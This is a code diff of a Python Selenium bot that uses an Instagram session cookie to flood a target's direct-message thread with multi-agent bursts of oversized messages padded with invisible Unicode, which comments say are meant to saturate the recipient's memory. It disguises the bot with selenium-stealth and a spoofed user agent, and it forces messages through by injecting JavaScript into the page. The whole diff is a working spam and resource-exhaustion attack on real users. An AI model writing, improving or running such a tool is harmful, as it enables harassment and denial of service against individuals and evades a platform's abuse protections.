@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (RESOURCE-EXHAUSTION V56)
-# 📅 STATUS: RAM-SATURATION | 4-AGENT TOTAL | AWS-HARD-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (DIRECT-INJECT V58)
+# 📅 STATUS: TYPING-FIX-ACTIVE | 4-AGENT TOTAL | AWS-CPU-TARGET
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -8,36 +8,31 @@ from selenium import webdriver
 from selenium_stealth import stealth
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.08)  # 🔥 Hyper-Velocity
-REST_AFTER_STRIKES = 200   
-REST_DURATION = 2          
+BURST_SPEED = (0.3, 0.8)    # 🛡️ Slightly slower to ensure 'Enter' registers
+REST_AFTER_STRIKES = 100   
+REST_DURATION = 5          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_high_entropy_payload():
-    """Generates a randomized, high-byte payload to bypass browser deduplication."""
+def get_heavy_payload():
+    """Generates a visible, high-impact block for 32GB RAM saturation."""
     u_id = random.randint(100, 999)
-    # High-plane characters (4-bytes each) to bloat the memory buffer
-    entropy_chars = ["𒀱", "𒈓", "𒈙", "🌙", "𝕻", "𝕬", "𝕰", "𝕽"]
-    glue = "\u2060" # Word Joiner (forces the browser to treat it as one object)
-    
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STRIKE:{u_id}]"
-    
+    glue, iso, zwj, pop = "\u2060", "\u2068", "\u200D", "\u2069"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NODE_STRIKE:{u_id}]"
     body = []
-    # 420 lines of unique memory allocations
-    for i in range(420):
-        # Shuffling ensures every line is a unique memory address
-        random.shuffle(entropy_chars)
-        line = f"PRAVEER PAPA {''.join(entropy_chars * 6)} {i}{glue*5}"
+    for i in range(350):
+        # We use a mix of standard and 'Invisible Math' (\u2068)
+        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {i}{pop}{glue*15}"
         body.append(line)
-        
-    return f"{header}\n{glue.join(body)}".strip()[:9998]
+    return f"{header}\n{glue.join(body)}".strip()[:9995]
 
 def get_driver(agent_id):
     with BROWSER_LAUNCH_LOCK:
@@ -45,60 +40,75 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu") # Keep YOUR bot light
+        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
         
-        driver = webdriver.Chrome(options=chrome_options)
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service, options=chrome_options)
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def atomic_send(driver, text):
-    """Zero-latency DOM injection to bypass local input bottlenecks."""
+def force_send_js(driver, text):
+    """Overrides the React state to stop the 'typing' hang."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
+                // 1. Hard reset the box
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
+                // 2. Inject text
                 document.execCommand('insertText', false, arguments[0]);
+                
+                // 3. Force state sync (Crucial to stop 'typing' status)
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                var e = new KeyboardEvent('keydown', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true});
+                box.dispatchEvent(new Event('change', { bubbles: true }));
+                
+                // 4. Force hardware-level Enter event
+                var e = new KeyboardEvent('keydown', {
+                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
+                    bubbles: true, cancelable: true
+                });
                 box.dispatchEvent(e);
             }
         """, text)
         return True
-    except: return False
+    except:
+        return False
 
 def run_life_cycle(agent_id, cookie, target):
     while True:
-        driver = get_driver(agent_id)
         try:
+            driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(12) 
+            time.sleep(15) 
             
             strike_count = 0
             while True:
-                payload = get_high_entropy_payload()
-                if atomic_send(driver, payload):
+                payload = get_heavy_payload()
+                if force_send_js(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Resource-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Direct-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 80 == 0:
+                    if strike_count % 60 == 0:
                         driver.refresh()
-                        time.sleep(5)
+                        time.sleep(10)
                 time.sleep(random.uniform(*BURST_SPEED))
-        except: pass
+        except:
+            pass
         finally:
-            if driver: driver.quit()
-            time.sleep(2)
+            try: driver.quit()
+            except: pass
+            time.sleep(5)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
